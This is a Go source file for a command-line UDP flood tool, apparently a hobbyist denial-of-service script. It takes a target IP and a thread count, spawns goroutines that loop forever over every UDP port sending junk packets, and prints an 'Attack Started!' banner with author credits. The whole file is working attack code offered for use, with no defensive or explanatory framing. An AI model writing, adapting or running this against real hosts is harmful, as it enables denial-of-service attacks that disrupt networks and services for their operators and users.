package main

import (
	"flag"
	"fmt"
	"net"
	"time"
)

var (
	ip      = flag.String("ip", "127.0.0.1", "Target IP Address")
	threads = flag.Int("t", 150, "This Will Make The UDP Flood More Powerful")
)

func attack(ip string) {
	for {
		for port := 1; port <= 65535; port++ {

			target := fmt.Sprintf("%s:%d", ip, port)

			addr, err := net.ResolveUDPAddr("udp", target)

			if err != nil {
				continue
			}

			conn, err := net.DialUDP("udp", nil, addr)

			if err != nil {
				continue
			}

			data := []byte("Flooding")

			conn.Write(data)

			time.Sleep(1 * time.Millisecond)
			conn.Close()
		}
	}
}

func main() {
	flag.Parse()

	for i := 0; i < *threads; i++ {
		go attack(*ip)
	}

	fmt.Printf(`
 __  __     _____     ______      ______   __         ______     ______     _____     ______     ______    
/\ \/\ \   /\  __-.  /\  == \    /\  ___\ /\ \       /\  __ \   /\  __ \   /\  __-.  /\___  \   /\___  \   
\ \ \_\ \  \ \ \/\ \ \ \  _-/    \ \  __\ \ \ \____  \ \ \/\ \  \ \ \/\ \  \ \ \/\ \ \/_/  /__  \/_/  /__  
 \ \_____\  \ \____-  \ \_\       \ \_\    \ \_____\  \ \_____\  \ \_____\  \ \____-   /\_____\   /\_____\ 
  \/_____/   \/____/   \/_/        \/_/     \/_____/   \/_____/   \/_____/   \/____/   \/_____/   \/_____/ 
	`)
	fmt.Print("Author: \033[33mRE70-DECEMBER\033[0m \n")
	fmt.Print("	Special Thanks To \033[33mYassinox\033[0m and \033[33mMozi\033[0m \n")

	fmt.Println()
	fmt.Printf("Attack Started! --> IP: %s Threads %d\n\n", *ip, *threads)
	select {}

}
